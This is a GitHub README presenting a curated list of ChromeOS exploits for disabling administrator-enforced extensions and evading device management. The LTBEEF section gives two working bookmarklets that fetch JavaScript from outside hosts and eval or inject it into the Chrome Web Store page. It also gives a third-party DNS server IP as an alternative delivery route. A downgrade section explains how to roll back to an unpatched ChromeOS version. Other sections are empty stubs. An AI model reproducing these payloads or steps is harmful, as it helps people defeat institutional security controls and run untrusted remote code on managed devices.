# EXT-REMOVER
This is a curated list of exploits for ChromeOS.   
Many of these exploits can destory your computer if used inproperly.  
  
[Echo put your shebeal  about how chromebooks are trash here]

![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)  
Credit: LittleMissNyan

<details>
<summary><b>LTBEEF</b></summary>
LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore.  

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
The origional site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
  
**Instlation**  
There are several vesions of thisexploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())```
    - Compact Cow's UI  
    ```javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});```  

    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers"
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)
    Set every box there to the following ip:  
    ```158.101.114.159``` (Hosted by The Greatest Giant#0110)  
    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. 
</details>  

<details>
<summary><b>SH1mmer</b></summary>


</details>

<details>
<summary><b>Point Blank</b></summary>
Point Blank

</details>

<details>
<summary><b>Downgrading</b></summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for sertain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.  
   
<i>Requirements</i>
1. USB A thumb drive with at least 16gb storage
2. A personal computer with access to downloading extentions

<i>Setup</i>
1. Navigate to chrome://version on the chromebook you with to downgrade and check for your board under "Platform" (ex I have a c3100 and it's board is stable-channel octopus)
2. Navigate to https://chrome100.dev/ , press ctrl+f and type in your board
3. Find and download the chrome version you want to your personal computer

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en</a>  
2. Open the extention, and click on the settings button in to top right hand corner, click "use local image"  
3. Select the recovery image you downloaded from chrome100  
4. Plug in the USB you wish to use, and follow the prompts on the screen  

5. On your chromebook, press esc+reload+power and follow the prompts  
6. On the checking for updates screen, press ctrl+shift+e to skip the "checking for updates" screen  

7. Profit

</details>

<details>
<summary><b>Full Unenrollment</b></summary>
See SH1mmer 🤓
</details>